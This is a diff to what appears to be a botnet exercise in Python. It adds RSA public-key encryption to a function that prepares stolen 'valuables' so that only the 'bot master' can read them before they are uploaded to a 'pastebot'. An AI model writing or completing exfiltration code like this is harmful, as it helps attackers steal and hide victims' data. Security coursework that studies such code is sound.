@@ -1,5 +1,9 @@
 import os
 
+from Crypto.Cipher import PKCS1_v1_5
+from Crypto.PublicKey import RSA
+from Crypto.Hash import SHA
+
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
 filestore = {}
@@ -13,7 +17,12 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    return data
+	
+    public_key = RSA.importKey(open('mykeypublic.pem').read())
+    cipher = PKCS1_v1_5.new(public_key)
+    ciphertext = cipher.encrypt(data)
+	
+    return ciphertext
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
